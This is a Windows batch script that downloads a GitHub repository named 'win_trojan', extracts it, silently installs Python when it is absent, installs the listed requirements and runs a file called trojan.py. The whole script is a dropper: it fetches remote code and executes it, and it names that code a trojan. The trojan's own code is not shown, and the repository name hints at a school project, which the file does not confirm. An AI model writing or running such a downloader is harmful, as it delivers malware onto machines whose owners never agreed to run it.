@echo off
SETLOCAL EnableDelayedExpansion

:: --- Configuration ---
SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
SET "ZIP_FILE=win_trojan.zip"
SET "EXTRACT_DIR=win_trojan-main"
SET "PYTHON_EXE=python"

echo [*] Starting setup for win_trojan...

:: 1. Download the repository
echo [*] Downloading repository from GitHub...
powershell -Command "Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to download the repository. Check your internet connection.
    pause
    exit /b
)

:: 2. Extract the ZIP file
echo [*] Extracting files...
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '.' -Force"
del %ZIP_FILE%

:: 3. Check if Python is installed
echo [*] Checking for Python installation...
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [*] Attempting to download and install Python (Silent)...
    
    :: Downloads the Python 3.11.x web installer
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile 'python_installer.exe'"
    
    echo [*] Installing Python... Please wait.
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    del python_installer.exe
    
    :: Refresh Path for the current session
    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\"
    SET "PYTHON_EXE=python"
) else (
    echo [!] Python detected.
)

:: 4. Move into the extracted directory
cd %EXTRACT_DIR%

:: 5. Install requirements
if exist "requirements.txt" (
    echo [*] Installing requirements from requirements.txt...
    %PYTHON_EXE% -m pip install --upgrade pip
    %PYTHON_EXE% -m pip install -r requirements.txt
) else (
    echo [!] No requirements.txt found. Skipping pip install.
)

:: 6. Run the main script
if exist "trojan.py" (
    echo [*] Running trojan.py...
    %PYTHON_EXE% trojan.py
) else (
    echo [!] Error: trojan.py not found in %EXTRACT_DIR%.
)

pause
